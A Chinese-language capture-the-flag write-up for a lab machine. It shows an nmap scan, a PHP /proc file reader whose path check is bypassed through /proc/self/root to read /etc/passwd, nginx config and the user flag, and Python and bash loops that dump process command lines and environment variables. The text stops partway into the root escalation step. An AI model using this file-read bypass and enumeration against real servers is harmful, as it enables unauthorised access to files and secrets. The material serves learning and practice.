发现IP,nmap探测一下
```
──(root㉿kali)-[/home/kali]
└─# nmap -sS -sV -p- 192.168.1.124
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-04 09:32 EST
Nmap scan report for 192.168.1.124
Host is up (0.0014s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 10.0 (protocol 2.0)
80/tcp    open  http    nginx
40295/tcp open  unknown
MAC Address: 00:0C:29:E2:D4:15 (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.65 seconds
```
文件探测发现phpinfo（）了解php版本为8.3.27。并认为存在文件上传漏洞
PHP Version 8.3.27 
disable_functions no value no value 
file_uploads On On upload_tmp_dir no value no value 
open_basedir no value no value

发现index.php页面为/proc/3472/status的信息
经过测试发现能读取/proc/数字/status
/proc/1/cmdline->/sbin/init
![image.png](https://gitee.com/fogpost/photo/raw/master/202603042259359.png)

攻击链为首先LFI，利用Proc提权或RCE。

利用/proc/3473/fd/5获取到文件句柄，发现可以调用
action=read
action=list
```php
<?php
error_reporting(0);
header("Content-Type: text/plain; charset=utf-8");
header("X-Content-Type-Options: nosniff");
header("Content-Disposition: inline");

class ProcReader {
    private $allowedBase = '/proc/';

    public function validatePath($filePath) {
        if (preg_match('/^[a-zA-Z0-9.+-]+:\/\//', $filePath)) {
            return false;
        }

        $path = str_replace(['//', './'], ['/', ''], $filePath);

        if (strpos($path, '..') !== false) {
            return false;
        }

        return strpos($path, $this->allowedBase) === 0;
    }

    public function readFile($filePath) {
        if (!$this->validatePath($filePath) || !is_readable($filePath)) {
            return "Error: Access Denied or File Unreadable";
        }
        
        $content = @file_get_contents($filePath);
        if ($content === false) return "Error: Read failed";
        
        return str_replace("\0", " ", $content);
    }
}

$reader = new ProcReader();
$action = $_GET['action'] ?? 'read';
$file = $_GET['file'] ?? '/proc/self/status';

if ($action === 'read') {
    echo $reader->readFile($file);
} elseif ($action === 'list') {
    $dirs = @glob('/proc/[0-9]*', GLOB_ONLYDIR);
    echo implode(PHP_EOL, $dirs);
}
```
利用action=list找到目标进程，利用/proc/pid/cmdline发现服务件，同时发现没有检查符号连接真实路径和realpath（）
利用/?file=/proc/self/root/etc/passwd获取passwd发现用户514
```
root:x:0:0:root:/root:/bin/sh
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
klogd:x:100:101:klogd:/dev/null:/sbin/nologin
nginx:x:101:102:nginx:/var/lib/nginx:/sbin/nologin
514:x:1000:1000::/home/514:/bin/sh
```
利用root文件绕过查找到用户flag
?file=/proc/self/root/home/514/user.txt

## 尝试提权到root用户
/?file=/proc/self/root/etc/nginx/http.d/default.conf 
找到nginx的目录/var/www/localhost
```
server {
    listen 80 default_server;
    root /var/www/localhost;
    index index.php index.html index.htm;

    location / {
        try_files $uri $uri/ =404;
    }

    location ~ \.php$ {
        try_files $uri =404;
        fastcgi_pass 127.0.0.1:9000;
        fastcgi_index index.php;
        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
        include fastcgi_params;
    }

    location ~ /\.ht {
        deny all;
    }

    location = /404.html {
        internal;
    }
}
```

回顾：
借助scdyh的wp获取env和cmdline,以及nop的脚本，好好学习脚本了😋
```python
import requests
url = "http://192.168.32.230/index.php"
pids_raw = requests.get(f"{url}?action=list").text.strip().split('\n')
for pid_path in pids_raw:
   pid = pid_path.split('/')[-1]
   # 尝试读取该进程的 cmdline
   cmd = requests.get(f"{url}?file=/proc/{pid}/cmdline").text
   # 尝试读取该进程的环境变量
分别去读一下
   env = requests.get(f"{url}?file=/proc/{pid}/environ").text
   if cmd and "Error" not in cmd:
       print(f"--- PID {pid} ---")
       print(f"CMD: {cmd.replace('', ' ')}")
       if "514" in env or "FLAG" in env or "hint" in env:
           print(f"ENV: {env}")
```
```bash
#!/bin/bash
URL="http://172.18.105.157"

for pid in $(curl -s "$URL/?action=list" | sed 's|/proc/||'); do
    CMD=$(curl -s "$URL/?file=/proc/$pid/cmdline" | tr '\0' ' ')
    if [[ -n "$CMD" ]]; then
        echo "PID $pid: $CMD"
    fi
done
```
发现存在gdbserver用户
```bash
PID 1: /sbin/init 
PID 3202: /sbin/udhcpc -b -R -p /var/run/udhcpc.eth0.pid -i eth0 -x hostname:Koishi 
PID 3302: /sbin/syslogd -t -n 
PID 3329: /sbin/acpid -f 
PID 3355: /usr/sbin/crond -c /etc/crontabs -f 
PID 3382: /usr/bin/gdbserver --multi :0 
PID 3413: nginx: master process /usr/sbin/nginx -c /etc/nginx/nginx.conf 
PID 3414: nginx: worker process                    
PID 3415: nginx: worker process                    
PID 3441: /usr/sbin/ntpd -N -p pool.ntp.org -n 
PID 3474: php-fpm: master process (/etc/php83/php-fpm.conf)                 
PID 3503: php-fpm: pool www                                                  
PID 3504: php-fpm: pool www                                                  
PID 3506: sshd: /usr/sbin/sshd [listener] 0 of 10-100 startups 
PID 3840: Error: Access Denied or File Unreadable
``` 
这里发现可以利用/proc/net/tcp来发现tcp端口服务,看了wp才知道，对linux系统所了解的还是只有些基础命令罢了
```
  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode                                                     
   0: 00000000:0050 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 15203 1 0000000048957835 100 0 0 10 0                     
   1: 00000000:0016 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 2598 1 000000001bb14b32 100 0 0 10 0                      
   2: 0100007F:2328 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 2591 1 00000000d3cb2204 100 0 0 10 0                      
   3: 0100007F:2328 0100007F:DE62 01 00000000:00000008 00:00000000 00000000 65534        0 17943 1 000000007125244f 20 4 30 10 -1                    
   4: 0100007F:DE62 0100007F:2328 01 00000000:00000000 00:00000000 00000000   101        0 17946 2 0000000015830c0d 20 0 0 10 -1                     
   5: 9D6912AC:0050 4A6412AC:DC4C 01 00000000:00000000 00:00000000 00000000   101        0 17944 2 00000000cefb362c 20 4 33 10 -1                    
   6: 0100007F:2328 0100007F:DE56 06 00000000:00000000 03:000014F5 00000000     0        0 0 3 00000000a55310ee                                      
```